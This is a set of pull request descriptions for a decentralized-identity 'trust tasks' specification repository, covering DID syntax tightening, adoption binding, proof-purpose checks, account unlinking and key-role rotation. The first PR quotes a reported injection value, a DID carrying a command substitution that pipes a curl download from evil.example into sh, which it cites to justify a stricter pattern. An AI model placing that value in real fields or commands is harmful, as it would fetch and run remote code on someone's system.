title: feat(git-ns): hold every DID to the W3C DID Core syntax
body:
## Problem

The shared `Did` in `git-ns/_shared` (0.1 and 0.2) is `^did:[a-z0-9]+:\S+$`. It accepts anything without whitespace after the method, including shell metacharacters, quotes, backticks, `/`, `?` and `#`. A security review found that `did:web:x.example$(curl${IFS}-s${IFS}evil.example|sh)` validated as a right's subject and later showed up in a copyable shell command in an admin UI.

## Change

**`git-ns/_shared/0.3`** changes `Did` to a bare DID as defined in [DID Core §3.1](https://www.w3.org/TR/did-core/#did-syntax):

```
^did:[a-z0-9]+:(?:(?:[A-Za-z0-9._-]|%[0-9A-Fa-f]{2})*:)*(?:[A-Za-z0-9._-]|%[0-9A-Fa-f]{2})+$
```

That is `method-name = 1*(%x61-7A / DIGIT)` and `method-specific-id = *( *idchar ":" ) 1*idchar`, with `idchar = ALPHA / DIGIT / "." / "-" / "_" / pct-encoded`. A path, query or fragment is rejected. Every member typed `Did` names a party, never a key. Those members are `subject`, `owners`, `grantedBy`, repo/transfer's `to` and bridge/job's `subject` / `desiredRoles[].subject`. No DID-URL field in the family uses `Did`. `maxLength` stays at 2048. Every other definition is byte-identical to 0.2.

The framework has no DID pattern to reuse: `issuer` and `recipient` are unconstrained VIDs (SPEC §3). Other families only use `^did:` prefixes or method-specific patterns.

## Versioning

- **New shared version rather than an in-place edit.** SPEC §6.6 item 1 says a narrowed constraint in a shared schema component MUST be published as a new component version. So `_shared/0.1` and `0.2` are unchanged.
- **New versions of the consuming specs.** Under §6.6 item 3, a spec adopts a new component version by publishing a new version of itself. The in-place rule in §5.2 covers only re-pins that don't change the wire shape, and this one does. Every git-ns spec is `draft`, so this breaking change ships as a `MINOR` increment under the draft allowance of §5.2:

  | Spec | New version | Where `Did` appears |
  |---|---|---|
  | `git-ns/view` | 0.3 | response (`repos[].owners`, `rights[]`) |
  | `git-ns/bridge/job` | 0.3 | request |
  | `git-ns/drift/resolve` | 0.2 | response |
  | `git-ns/namespace/reseat` | 0.2 | request + response |
  | `git-ns/repo/adopt` | 0.2 | request + response |
  | `git-ns/repo/archive` | 0.2 | response |
  | `git-ns/repo/create` | 0.2 | response |
  | `git-ns/repo/transfer` | 0.2 | request + response |
  | `git-ns/right/grant` | 0.2 | request + response |
  | `git-ns/right/revoke` | 0.2 | request + response |

  Each new version restates its predecessor, adds a *Changes from* section, pins `_shared/0.3`, and links to the newest versions of its sibling specs. Specs that carry no `Did` are unchanged: `account/*`, `bridge/event`, `bridge/result`, `namespace/bind` and `namespace/unbind`.
- **What this does not fix.** The older spec versions still pin the permissive pattern, and a consumer that accepts them should validate DIDs itself. The implementation that rendered the command needs its own fix in any case.

## Tests

The six specs with a request-side `Did` get new invalid examples: shell metacharacters (the reported payload), whitespace, a `#` fragment and an uppercase method. bridge/job also gets a bad `desiredRoles[].subject`. I checked each one with ajv: the bad DID is rejected, and the same payload with a valid DID passes.

## Bindings

Regenerated for Rust, TypeScript, Go and Dart. In TypeScript, the hoisted `SharedComponents.Did`, `RepoSummary` and `RightRecord` now have two shapes, so they get family/version-qualified names (`Did_GitNsV0_1`, `Did_GitNsV0_3`, and so on), as in #508. Each spec module still exports them under their plain names.

## Local results

All passing: `npm run build`, `test:infra`, `check-bindings`, `check-dart-packages`, `cargo fmt --check`, `cargo test --workspace --all-targets`, `cargo test -p trust-tasks-rs --features validate --all-targets` (it runs the new `rejects_invalid_examples` tests), `cargo clippy --all-features -D warnings`, TS `tsc --noEmit` / `npm test` / `npm run smoke`, Go `build` / `vet` / `test` / `gofmt`, and Dart `analyze --fatal-infos` / `test`.

title: feat(git-ns): drift/resolve 0.3 binds an adoption to the member it names
body:
## Problem

A `git-ns/drift/resolve` 0.2 `adopt` does not say who receives the right. The VTC finds the recipient by resolving the drift item's forge account to whoever has linked it **when the task runs**.

The sequence: a resolver reads the item and sees the account is linked to Bob, then decides and signs. In between, the account can be unlinked and linked to Dan through `git-ns/account/link`. The signed document then grants Dan a right, published to the Trust Registry, and nothing the resolver signed names him. `observed` bounds *which role* an adoption records; nothing bounds *to whom*.

## Change: `git-ns/drift/resolve` 0.3

- **New `subject`** (a `Did` from `_shared/0.3`): the member the resolver read as linked to the account. It is **required for `adopt`** and must be absent for `revert`; either mistake is refused as `malformedRequest`. That rule is in prose, the same way `observed` is already "required for adopt": no spec in the registry uses JSON-Schema conditionals, and the generators have never been exercised on them.
- **Adopt step 3:** refuse with the new **`git-ns/drift/resolve:subjectChanged`** when the account is now linked to someone other than `subject`. Linked to no current member stays `accountNotLinked`.
- **Adopt step 7:** the VTC MUST repeat the link check and the item selection under the same exclusion as the write that records the right. That way no relink can fall between the check and the write.
- **Adopt step 5 compares with the member's *projected* right**, not their effective one: the highest right recorded in their own name that reaches the repository, `git.ns.admin` counting for nothing (a namespace admin projects to no forge role). Under 0.2 a namespace admin's implied `own` made every forge role they were given unadoptable; now one holding `maintain` can have a forge `admin` adopted as `own`. The projected right of a role is stated for any bridge role map: the lowest right whose role it is, citing `git-ns/bridge/job` 0.4 (#635) and `git-ns/bridge/event` 0.3's `roleMapReported`. Only `own` may map to the forge admin role (job 0.4 refuses any other map), so the maintainers-as-admin example is gone. `git.ns.admin` itself never projects a forge role; an admin's own `maintain` and `commit.sign` project to non-admin roles and are allowed self-grants. On a personal account `own` and `maintain` both map to `write`, so separation of duties is enforced at the VTC, not the forge. Adopt step 7 cites `git-ns/right/grant` 0.3's fixed rules (plain text; 0.3 is on #641).
- **Adopt step 6, separation of duties** (the rule `git-ns/right/grant` 0.3 introduces in #641, which names this task among those it binds): an adoption that would record an elevated right for the resolver themselves is refused with **`git-ns:selfGrantNotAllowed`**. `subject` is compared with the DID the VTC resolved the resolver to *after* any delegation, so a console key cannot adopt for its admin. Only `git.repo.own` is an elevated right an adoption can record; `maintain` and `commit.sign` for oneself stay allowed. The message SHOULD name `git-ns/right/break-glass`. Policy cannot waive it. A VTC still serving 0.1/0.2 MUST apply it there too. New refusal example and a "Separation of duties" Security & Privacy subsection.
- **Security & Privacy** gains a "Binding the recipient" subsection. A VTC that also serves 0.1/0.2 SHOULD NOT accept an `adopt` over them and SHOULD refuse one naming 0.3.
- **Examples:** the adopt example carries `subject`, and there is a new `subjectChanged` refusal example. Examples now name 0.3 type URIs; 0.2's examples still said 0.1.
- **Invalid examples:** a DID URL with a `#` fragment, shell metacharacters, and a list as `subject`.
- **Bindings** regenerated for Rust, TypeScript, Go and Dart.

## Versioning

A 0.2 document is a 0.3 document with no `subject`. That is still a valid `revert` but now a malformed `adopt`, so a 0.2 client can revert through 0.3 but not adopt. Making a member required for one action is not backwards-compatible, so this is a MINOR increment under the draft allowance of SPEC §5.2. The spec stays `draft`, and 0.1 and 0.2 are untouched.

## Open question for reviewers

`git-ns/view` returns a member only their *own* account links; its spec calls the member-to-account join "the one piece of the answer the registry does not publish". So a client that has only `git-ns/view` (the openvtc TUI, for example) cannot learn `subject` for another member's role, and can no longer adopt one. The spec says so. Whether view should disclose that join to owners of a repository, for accounts holding a role there, is a separate privacy decision, and this PR deliberately does not make it.

## Checks

- `npm run validate` and `npm run build` pass.
- `npm run check-bindings`: 522 specs agree across TS, Rust, Go and Dart, and 1092 error codes match Rust `ERROR_CODES`.
- `cargo test -p trust-tasks-rs --features git-ns drift::resolve::v0_3` passes (4 tests, including `rejects_invalid_examples`).
- `go test ./specs/git-ns/drift/...` builds.

title: security(proof)!: check a proof's verificationMethod against its proofPurpose
body:
## What

- The stock `affinidi::Verifier` accepts a proof only when all of these hold:
  - the issuer's DID document lists the proof's `verificationMethod` under the relationship its `proofPurpose` names;
  - the document is the issuer's own;
  - the method's `controller` is the issuer.
- The signing default moves to `proofPurpose: authentication`.

## Why

W3C Data Integrity requires this check (Controlled Identifiers v1.0 §3.3, Retrieve Verification Method, steps 10 and 11). No verifier in the ecosystem was doing it:

- **0.22.x `CachedDidResolver`**: accepted a method listed under `authentication` or `assertionMethod`, whatever purpose the proof declared. An authentication-only key could produce an assertionMethod proof. It did not check the method's `controller`.
- **0.21.x**: required only that the method appear in `verificationMethod`, so a `keyAgreement`-only key could sign.

## Changes

- **`ProofPurpose`**: the four signing relationships. `parse` refuses `keyAgreement` and unknown values.
- **`ProofPurposeResolver`**: resolves a verification method for one purpose.
  - **`CachedDidResolver`** checks three things:
    1. the resolved document's `id` is the DID named in the method identifier;
    2. the method is listed under the purpose's relationship, by absolute DID URL, by `#fragment` relative to the document id, or embedded. A reference resolves only against the document's top-level `verificationMethod`, never to a method embedded under another relationship;
    3. the method's `controller` is that DID.
  - **`DidKeyResolver`** applies did:key's implicit relationships:
    - `did:key:<id>#<id>` is valid for all four purposes, and any other fragment is refused;
    - an X25519 did:key signs for nothing.
- **`Verifier`**: resolves through `ProofPurposeResolver` with the proof's own purpose.
- **`PurposeBound`**: the same check for callers of `DataIntegrityProof::verify`. It wraps a `ProofPurposeResolver` as an upstream `VerificationMethodResolver` bound to one purpose.
- **Signing**: `sign_trust_task` / `ProofExt::sign` default to `authentication`, and refuse `keyAgreement` and unknown purposes.
  - This follows the companion framework change. A Trust Task document's proof shows that the party controlling the issuer identifier produced it. `assertionMethod` is kept for proofs a specification defines as attestations.
- **Error messages**: resolver errors name the rule that failed. They contain no DID, document or key material.

## Breaking changes

The title carries `!`, so this is a compatibility bump of the version group.

| Change | Who is affected | Migration |
|---|---|---|
| `Verifier::with_resolver` takes `Arc<dyn ProofPurposeResolver>` | Custom key-only resolvers. `Arc::new(CachedDidResolver::new(..))` compiles unchanged. | Implement `ProofPurposeResolver` |
| `CachedDidResolver` no longer implements the purpose-unaware `VerificationMethodResolver` | Callers of `DataIntegrityProof::verify` with it (webvh `TransportBoundVerifier`, VTI `vta-mobile-core/src/proof.rs`, the tdk test mediator) | `PurposeBound::new(&resolver, ProofPurpose::parse(&proof.proof_purpose)?)` |
| Proofs failing the relationship, controller or purpose rule are refused | Signers whose key is not listed under the purpose they emit | Sign with a listed key/purpose |
| Default signing purpose is `authentication` | `sign_trust_task(.., SignOptions::new())` callers whose key is not under `authentication` | List the key under `authentication`, or pass `with_proof_purpose` |

The old purpose-unaware behaviour is not kept behind an escape hatch. No surveyed caller needs it: each can pass the proof's purpose through `PurposeBound`.

## Signer audit

This covers the production signers in VTI, VGI, openvtc, tdk-rs (mediator, messaging SDK), webvh-service, the trust registry, and this repo's TS/Go/Dart signers.

**Pass today.** Every one of them passes on the DID documents the current code creates:

- **VTC and VTA**: `#key-0` is listed under both `authentication` and `assertionMethod`.
- **did:key**: valid for all four purposes.
- **did:peer:2**: a `V` key is listed under `authentication` and `assertionMethod`, as `#key-1`, with the did:peer as controller.

**Could fail, depending on configuration or old data** (listed in the companion VTI PR, OpenVTC/verifiable-trust-infrastructure#1752):

- openvtc personhood VPs. These fail today under the strict VTC verifier: the persona's assertion-only `#key-1` signs with `authentication`. See OpenVTC/verifiable-trust-infrastructure#1752;
- the mediator/SDK fallback to an authentication-only key while emitting `assertionMethod`;
- vta-mcp's `key-0` default for did:key and did:peer holders;
- VTA derive-and-sign-document accepting any `proofPurpose` string;
- webvh control DIDs without `assertionMethod`.

**Default change.** With the `authentication` default, `sign_trust_task` callers whose key is listed only under `assertionMethod` (for example, openvtc personas made by the old `create_initial_webvh_did`) must pass `with_proof_purpose("assertionMethod")` or add the key to `authentication`.

## Spec

`SPEC.md` here is generated from the canonical framework repository (see CLAUDE.md), so the rule lands there first: trustoverip/dtgwg-trust-tasks-spec#24. It adds "Proof Purpose and Verification Relationship" under Proof and the `authentication` producer guidance. Regenerate `SPEC.md` once that merges.

## Per-task specification examples

The top-level document proofs in the per-task examples now show `proofPurpose: authentication` (204 examples in 123 specs), and so do the three non-normative "reference ecosystem signs with" notes. This is editorial: the examples are non-normative.

Left unchanged:

- proofs on embedded credentials, vetting cards and signed envelopes, which are attestations;
- specs whose normative text requires `assertionMethod`: `auth/step-up/approve-response` 0.1 to 0.4, `confirm/response` 0.1 and `vault/sign-trust-task` 0.1 and 0.2. Moving these to `authentication` needs new spec versions.

## Not in this PR

- The TS, Go and Dart proof packages still default to `assertionMethod` and do no relationship check. They only resolve did:key, so they are not exposed to the relationship bypass. Aligning their signing default is a follow-up.
- No version or CHANGELOG edits. The Release PR assigns them.

## Tests

`tests/proof_purpose.rs` (17 tests) covers:

- a key in the wrong relationship is refused (both directions);
- a key-agreement key and a key listed under no relationship sign for nothing;
- unknown purposes are refused;
- a method controlled by another DID, another DID's key, and a document for another DID are all refused;
- a relative reference resolves, and a relative reference to another fragment does not;
- an embedded method verifies for its own relationship only, and a reference cannot borrow a method embedded under another relationship;
- did:key verifies for every signing purpose, offline and through the cache, and a wrong fragment is refused;
- a did:peer V key verifies for `authentication` and `assertionMethod` only;
- `PurposeBound` over the upstream verify;
- a key under both relationships verifies either purpose (the migration shape);
- signing refuses `keyAgreement` and unknown purposes.

Existing tests are updated for the new default. `cargo clippy --workspace --all-targets -D warnings` and `cargo test --workspace --exclude trust-tasks-rs` pass locally.



## task-consent/decision stays assertionMethod

A `task-consent/decision` is the approver's attestation, not an operational message, so it is the exception to the move to `authentication`. `task-consent/decision/0.1` now requires it normatively: the producer MUST sign with `proofPurpose: assertionMethod`, using a key listed under the approver's `assertionMethod`. The consumer MUST refuse any other purpose, a key not listed there, or an approver DID it cannot resolve. The decision example is restored to `assertionMethod`, and its response stays `authentication`. The VTA and VTC already enforce this (OpenVTC/verifiable-trust-infrastructure#1757), as do the did-hosting RP, the mobile engine and the wallet.

title: feat(git-ns/account/unlink): a member unlinks their own forge account
body:
## Summary

Adds **`git-ns/account/unlink/0.1`**. `git-ns/account/link/0.1` says a binding lasts "until the member unlinks or leaves", but no task unlinked.

**Request.** `forge` (required), plus an optional `accountId` guard: the VTC unlinks only if that is still the account linked there, so a late request can't remove an account linked since. There is no `subject`: a caller unlinks only the account linked to their own DID.

**Who may unlink:** the DID the account is linked to. That includes a member whose access has lapsed but who hasn't left: their link stands, projects nothing, and removing it is theirs to do. A caller with nothing linked, a non-member included, gets `notLinked`. The VTC MUST NOT answer a non-member differently, so the refusal reveals nothing about who is a member.

**What the VTC does:**
1. Refuses with `git-ns/account/unlink:notLinked` if nothing is linked to the caller on that forge, or the linked account isn't `accountId`.
2. Does the rest atomically with respect to link completion.
3. Deletes the binding and anything joining the DID to the account. A binding credential, if it issued one, MUST be revoked.
4. Re-projects every bridge-mode namespace on that forge, promptly. The new `desiredRoles` don't list the account, so under `git-ns/bridge/job`'s rule ("people not listed lose any role the bridge manages") **the bridge withdraws exactly the roles it gave that account**. This works with VGI's bridge as it is today: it remembers what it projected and sets an unlisted account to `none`. No bridge change is needed.
5. MUST NOT use `removeAccounts` for this. A role the bridge didn't give wasn't given through the link: it stays, is reported as `roleAdded` drift, and is for the owners to revert.
6. Records an audit entry with the caller and the forge, and not the account id or login.

**Response.** `{ unlinked: ForgeAccount, unlinkedAt }`, returned without waiting for the bridge.

**Consent class** is `normal`; proof and `issuedAt` are REQUIRED. Git rights are unchanged.

**Future work, stated in the spec:** a community administrator unlinking *another* member's account.

**Changes to `git-ns/account/link/0.1`** (prose, draft spec):
- It links to the new task wherever it talks about unlinking.
- Item 4 now says the one-account-one-member check covers any member who hasn't left, whether or not their access is current.
- The check and the recording MUST be atomic against every other link and unlink.

Rust, TS, Go and Dart bindings are regenerated.

## Behaviour change to flag

None on the wire for existing tasks. The link-spec clarification makes a VTC refuse to link an account still held by a member whose access lapsed. Before, "another member" was ambiguous about lapsed members.

## Checks

- [x] `npm run build` (522 specs validated, invalid examples included)
- [x] codegen: Rust + `cargo fmt --all`, TS, Go, Dart
- [x] `npm run check-bindings`: all four agree; declared error codes match
- [x] `cargo build --workspace --all-targets`, `cargo test -p trust-tasks-rs --all-features`

Consumer: verifiable-trust-infrastructure (`vtc-service` handler, `cnm git unlink`, console), which will pin the released `trust-tasks-rs`.

title: security(didcomm)!: a consumer may require a proof over DIDComm
body:
The DIDComm binding lets a producer omit `proof`, because the authcrypt envelope authenticates the sender. This PR does two things.

**1. The binding (`bindings/didcomm/0.2` §5).** A consumer **MAY** decline that allowance and require an in-band `proof` on every document it accepts over DIDComm. It rejects:

- a document with no proof, as `proofRequired`;
- a document whose verified proof does not identify the transport-authenticated sender, as `identityMismatch`.

A consumer that authorizes on the sender's identity **SHOULD** do this. A producer **SHOULD** include `proof` on every document it sends over DIDComm, so the document is accepted whichever choice the consumer made.

**2. Five task families now declare `proof` REQUIRED.** In each of these, the consumer authorizes or answers based on the caller's identity alone. With a required proof, that identity comes from the document itself on every transport:

| Spec | Was | Now |
|---|---|---|
| `vtc/vetting/vetters/profile/0.1` | RECOMMENDED | REQUIRED |
| `vtc/vetting/vetters/resend/0.1` | RECOMMENDED | REQUIRED |
| `vtc/members/personhood/challenge/0.1` | RECOMMENDED | REQUIRED |
| `git-ns/view/0.1`, `0.2`, `0.3` | RECOMMENDED | REQUIRED |
| `git-ns/account/link-status/0.1` | RECOMMENDED | REQUIRED |

The rationales are rewritten to match. All of these specs are `draft`, so they are edited in place. Bindings are regenerated for Rust, TS, Go and Dart. `npm run build` and `npm run check-bindings` pass locally.

**Breaking:** the `IS_PROOF_REQUIRED` / `isProofRequired` constants for the tasks above become `true`. A conforming consumer now rejects a proofless request for any of them.

This is the spec side of a VTI change that requires a document proof, bound to the sender, on every Trust Task received over DIDComm. Draft, not for release yet.

title: feat(git-ns): drift/resolve 0.3 binds an adoption to the member it names (#640)
body:
feat(git-ns): drift/resolve 0.3 binds an adoption to the member it names (#640)

* feat(git-ns): drift/resolve 0.3 binds an adoption to the member it names

A drift/resolve 0.2 adoption did not name who receives the right. The VTC
resolved the item's forge account to whoever had linked it when the task
ran, so an account unlinked and linked again, to someone else, between the
resolver reading the item and signing granted a right, published to the
Trust Registry, to a member the resolver never saw. The signed document
said nothing otherwise: observed bounded which role an adoption records,
nothing bounded to whom.

drift/resolve 0.3 adds `subject`, the DID of the member the resolver read
as linked to the account. It is required for adopt and absent for revert,
refused as malformedRequest otherwise (as a missing `observed` is, and
likewise stated in prose rather than a schema conditional). The VTC adopts
only while the account is still linked to exactly that member, re-checked
under the same exclusion as the write that records the right, and refuses
otherwise with the new git-ns/drift/resolve:subjectChanged.

Versioning. A 0.2 document is a 0.3 document with no `subject`: still a
valid revert, now a malformed adopt. Required-for-one-action is not
backwards-compatible, so this is a MINOR increment under the draft
allowance of SPEC 5.2. A VTC serving older versions SHOULD NOT accept a
0.1 or 0.2 adopt, since it cannot know whom that resolver meant, and SHOULD
refuse one naming 0.3.

git-ns/view still returns a member only their own account links, so a
client that has only git-ns/view cannot adopt another member's role; the
spec says so. Invalid examples cover a DID URL, shell metacharacters and a
list as `subject`.

Bindings regenerated for Rust, TypeScript, Go and Dart.

Signed-off-by: Glenn Gore <glenn.g@affinidi.com>

* feat(git-ns): a roleChanged adoption raises the member's projected right

drift/resolve 0.2 refused a roleChanged adoption unless the observed role's
right was higher than the member's highest effective right. A namespace
admin's git.ns.admin implies git.repo.own on every repository, but it
projects to no forge role, so an admin who holds maintain in their own name
on a repository, and was given admin there on the forge, could never adopt
it: effective own left nothing higher to adopt.

0.3 compares with the member's projected right instead. That is the one
right desiredRoles lists them at: the highest right recorded in their own
name that reaches the repository (own, maintain or commit.sign on it, or
commit.sign on its namespace), ns.admin counting for nothing. A member with
none counts below commit.sign. The definition is written out in full
because bridge/job 0.3 and earlier list a member at their highest effective
right; bridge/job 0.4 (#635) is where desiredRoles moves to own-name rights.

The projected right of a role is stated for any role map the bridge
applies: the lowest right whose role it is, under the map reported with
git-ns/bridge/event roleMapReported (#639), or the default map without one.
git.ns.admin and git.repo.create are never a projected right. The
notAdoptable meaning and Changes from 0.2 say so.

Signed-off-by: Glenn Gore <glenn.g@affinidi.com>

* feat(git-ns): drift/resolve 0.3 refuses adopting an elevated right for oneself

An adoption records a right exactly as a grant does, but git-ns/right/grant
0.3's separation of duties (fixed rule 7) reached it only by reference. An
owner or namespace admin could raise their own role in the forge's interface
and adopt it, turning a forge-side change they made into a published
git.repo.own with nobody else involved.

Adopt gains step 6: when `subject` is the DID the VTC resolved the resolver
to, after any delegation it honours, and the right the adoption would record
is elevated, the VTC refuses with git-ns:selfGrantNotAllowed. Of the rights
an adoption can record only git.repo.own is elevated; adopting maintain or
commit.sign for oneself stays allowed. The message should name
git-ns/right/break-glass. Policy cannot waive the rule; it applies before
policy is evaluated.

A 0.2 self-adoption of own was accepted, so a VTC still serving 0.1 or 0.2
must apply the same refusal to them. Adds the error code, a refusal example
and a Security & Privacy subsection. Rust binding regenerated (the other
bindings carry no error codes and are unchanged).

Signed-off-by: Glenn Gore <glenn.g@affinidi.com>

* spec(git-ns/drift/resolve): 0.3 cites job 0.4 and event 0.3's role map; ns.admin projects no role

Cite bridge/job 0.4 and bridge/event 0.3's roleMapReported for the role
mapping, and grant 0.3's fixed rules for adopt. Drop the maintainers-as-admin
example: only own may map to the forge admin role. State that ns.admin itself
never projects a forge role while an admin's own maintain and commit.sign do,
and that on a personal account separation of duties is enforced at the VTC.

Signed-off-by: Glenn Gore <glenn.g@affinidi.com>

---------

title: feat(git-ns): re-project roles on demand, and the bridge reports its role map
body:
## Summary

Two follow-ups to the configurable bridge role map (VGI #84).

**`git-ns/bridge/event` 0.3 — `roleMapReported`.** The bridge reports, per namespace, the role map it projects rights with, *as the forge applies it* (rounded onto the forge's ladder — so a GitHub personal account reports `write/write/none`), each repository whose map differs (`repos`), and each repository whose roles it last projected under a different map (`stale`). Sent whenever the bridge starts serving a namespace (start-up, a completed binding, a namespace handed to it), whenever it (re)establishes its link to the VTC, and whenever the map changes. When the serving bridge's DID changes, the VTC treats the map as unknown (the default map, shown as unknown) until the new bridge reports. The VTC:
- refuses an unordered map (`own ≥ maintain ≥ commit`, `commit ≤ write`) and confines `repos`/`stale` to the namespace (step 2, as for every other resource in an event);
- uses the map wherever it shows or derives a forge role — notably the *projected right of a role* in `git-ns/drift/resolve` (lowest right whose role is that role);
- SHOULD re-project each stale repository without waiting for anyone. Re-projecting changes no right, and the bridge would apply the map at the next projection anyway; the only change is *when*.
- The map has **no member for `git.ns.admin`**: a namespace admin projects to no forge role whatever the configuration (the 2026-09-25 decision, #635).

**`git-ns/roles/reproject` 0.1 (new).** A community administrator or a `git.ns.admin` by explicit record, or for a single repository its owner (`git.repo.own`, explicit or implied), has the VTC send the complete `desiredRoles` of that repository or of every active/orphaned repository in a namespace again. No right changes, nothing is published, the audit record keeps who and why. Refused in manual mode (`manualMode`) and while the bridge has lost access (`noForgeAccess`, retryable). The spec does not declare a consent class (§7.3 item 13); its Security section describes the impact as below any grant or revocation.

**`git-ns/drift/resolve` is not changed.** 0.2 is released, so it is left as on main. Every version already defines the *projected right of a role* as the inverse of the bridge's mapping; event 0.3 (request step 5.3) says how the VTC learns that mapping and which right is the inverse when two rights share a role. That covers #640's drift/resolve 0.3 as well.

Adding an event type is a `MINOR` under the draft allowance: a VTC on 0.2 refuses the new type.

Bindings regenerated for Rust, TypeScript, Go and Dart.

## Release

VGI (vgi-bridge) and VTI (vtc-service) implement both and need a `trust-tasks-rs` release carrying `git-ns/bridge/event` 0.3 and `git-ns/roles/reproject` 0.1 before their PRs compile in CI.

## Test plan

- [x] `npm run validate`
- [x] `npm run check-bindings` — all four languages agree
- [x] `cargo check -p trust-tasks-rs --all-features`

title: feat(git-ns): re-project roles on demand, and the bridge reports its role map (#639)
body:
feat(git-ns): re-project roles on demand, and the bridge reports its role map (#639)

* feat(git-ns): re-project roles on demand, and the bridge reports its role map

A bridge's role map (which forge role own, maintain and commit.sign get)
is the community's to configure per bridge, forge, namespace and
repository, but nothing told the VTC what map was in force, and a
change reached a repository only at its next unrelated projection.

- git-ns/bridge/event 0.3: a new event type, roleMapReported. The bridge
  reports, per namespace, its role map as the forge applies it (rounded
  onto the forge's ladder: `none` < `read` < `triage` < `write` <
  `maintain` < `admin`), each repository whose map differs (`repos`), and
  each repository whose roles it last projected under a different map
  (`stale`). Sent at start-up, on a map change and after bindCompleted.
  The map has no member for git.ns.admin: a namespace admin projects to
  no forge role whatever the configuration. The VTC refuses an unordered
  map, confines `repos` and `stale` to the namespace, uses the map
  wherever it shows or derives a forge role, and SHOULD re-project each
  stale repository. Everything else is restated unchanged from 0.2; the
  schema pins _shared/0.3, wire-identical for every event shape.

- git-ns/roles/reproject 0.1 (new): a community administrator, or a
  namespace admin by explicit record, has the VTC send the complete
  desiredRoles of one repository, or of every active or orphaned
  repository in a namespace, again. No right changes and nothing is
  published; the audit record says who asked and why. Refused in manual
  mode (manualMode) and while the bridge has no access (noForgeAccess).

- git-ns/drift/resolve 0.2 (draft, in place): the projected right of a
  role is the lowest right whose role in the bridge's reported map is
  that role; the default map without a report.

Bindings regenerated for Rust, TypeScript, Go and Dart.

Signed-off-by: Glenn Gore <glenn.g@affinidi.com>

* spec(git-ns/bridge/event): Forgejo's maintain is a level of its own ladder

Signed-off-by: Glenn Gore <glenn.g@affinidi.com>

* spec(git-ns/bridge/event): no description beside a RoleMap or MappedRole $ref, so the TypeScript binding emits each once

Signed-off-by: Glenn Gore <glenn.g@affinidi.com>

* spec(git-ns/bridge/event): no description on the RoleMapReported variant, which rustdoc read as a code block

Signed-off-by: Glenn Gore <glenn.g@affinidi.com>

* spec(git-ns): owners re-project their own repository; the bridge reports on every link-up

- git-ns/roles/reproject 0.1: a repository's owner, by `git.repo.own`
  held explicitly or by implication, may re-project that repository.
  A namespace still needs the community-administrator capability or
  `git.ns.admin` by explicit record. The caller's entitlement is checked
  before the repository is looked up.
- git-ns/bridge/event 0.3: the bridge sends `roleMapReported` whenever it
  starts serving a namespace, whenever it establishes or re-establishes
  its link to the VTC, and whenever its map changes. When the serving
  bridge's DID changes, the VTC treats the map as unknown: it derives
  with the default map and shows the map as unknown until the new bridge
  reports.
- git-ns/drift/resolve 0.2 is restored to main. It has been released, so
  it is not edited in place. Every version of drift/resolve defines the
  projected right of a role as the inverse of the bridge's mapping; the
  report is how the VTC learns that mapping, so no drift/resolve version
  changes.

Signed-off-by: Glenn Gore <glenn.g@affinidi.com>

* spec(git-ns/bridge/event): an unknown role map derives nothing, the newest report wins, a report names its ladder

- While the VTC holds no report from the bridge serving the namespace
  (after binding, after a change of bridge, or a bridge before 0.3), the
  map is unknown. The VTC assumes no default: it refuses an adoption with
  the new git-ns:roleMapUnknown, and weighs any revert of a role as
  revoking git.repo.own. The default holds only when a bridge reports it.
  git-ns/drift/resolve 0.1 and 0.2 declare the code and the weighing.
- Reports are ordered by issuedAt. A VTC ignores one issued before the
  report it holds from the same bridge, and a bridge builds every report
  afresh, a resend included, so a later issuedAt carries the later map.
- roleMapReported carries the forge's ladder for the namespace. A VTC
  refuses a map with a role not on it, and a ladder that differs from one
  it knows (a GitHub personal account offers only write).
- A bridge does not report a map that rounding leaves unordered.
- The new examples sign with proofPurpose authentication, as #637 does for the
  other git-ns examples.

title: feat(vta/webvh/dids/keys): named key roles and per-role rotation for a VTA's DIDs
body:
## Summary

Trust Tasks for managing the **key roles** of the `did:webvh` identities a VTA holds keys for — its own, and those of the VTCs/VTNs provisioned on it — so every client (pnm, cnm, browser plugin, VTC console, iOS agent) drives the same protocol. Aligned with the VTI key-roles draft, trustoverip/dtgwg-vti-spec#42: roles `attestation` (only `assertionMethod`), `operational` (only `authentication`), `messaging` (only `keyAgreement`), `update` (log update authority, never a verification method). `capabilityInvocation`/`capabilityDelegation` stay reserved.

### New
| Spec | Purpose |
|---|---|
| `vta/_shared/0.3` (`did-key-roles.schema.json`, `CONVENTIONS.md`) | Role→relationship mapping; least-privilege authorization matrix; **preview → bound step-up → optional quorum**; custody (attestation/update keys generated, never derived, never exported, never in backups); public vs custody projections; audit rows incl. refusals; retired vs revoked; family error codes `vta/webvh/dids:*`; **only key-role identities** (pre-role DIDs refused with `notKeyRoleIdentity`, create a new identity; no migration); **§11 overlap by role** |
| `vta/webvh/dids/keys/list/1.0` | Keys by role with state (`pending/staged/active/retiring/retired/revoked`), custody, rotation history, pending approvals |
| `vta/webvh/dids/keys/add/1.0` | Add a generated key to a role (e.g. ML-DSA-44 attestation key beside Ed25519) |
| `vta/webvh/dids/keys/retire/1.0` | Planned retirement — completes or aborts a rotation; destroys a retired attestation key |
| `vta/webvh/dids/keys/revoke/1.0` | Revocation for compromise: no overlap, recorded `compromisedSince`, emergency replacement, never blocked by an in-progress change, re-issuance follow-up |
| `vtc/credentials/reissue/0.1` | After an attestation-key compromise: re-sign status lists first, then re-issue credentials in force with identical claims and expiry; idempotent per revoked key; counts only |

### New major versions — **breaking** for producers of the old version
- `vta/webvh/dids/rotate-keys/2.0` — one role per rotation, in four phases: publish → wait until the **cache horizon** (publication + max(TTL, verifier cache cap, 24 h proposed per VTI-KEY-134)) → switch signing → retire at overlap end; a planned overlap never ends before the cache horizon. Per role: attestation both in `assertionMethod` (predecessor destroyed at retire, past artefacts judged by DID version at issuance); operational both in `authentication`; messaging both in `keyAgreement` with the VTA holding both private keys and senders free to encrypt to either (predecessor destroyed at retire); update key no overlap (pre-rotation handover in one entry). Compromise revocation: no overlap. Closes 1.0's defects: rotated every role at once, derived every successor as Ed25519 (x25519/ML-DSA keys got Ed25519 bytes), left `capabilityInvocation`/`capabilityDelegation` pointing at old keys, and created no key records for the new methods. No shipped client sends 1.0 (only the SDK method and tests).
- `vta/webvh/dids/update/2.0` — refuses any change to `verificationMethod`, verification relationships or `keyRoles` (`keyMembersManaged`): in 1.0 anyone allowed to add a service endpoint could add a key to `assertionMethod`. Adds `dryRun`/`previewId`. **Client impact:** `pnm did-mgmt dids edit` must lock key members.

### In-place tightening of drafts — **behavioural break**, flagged
- `keys/revoke/0.1` — new `keys/revoke:boundToIdentifier`: a key still published in a DID role cannot be revoked at the custodian alone.
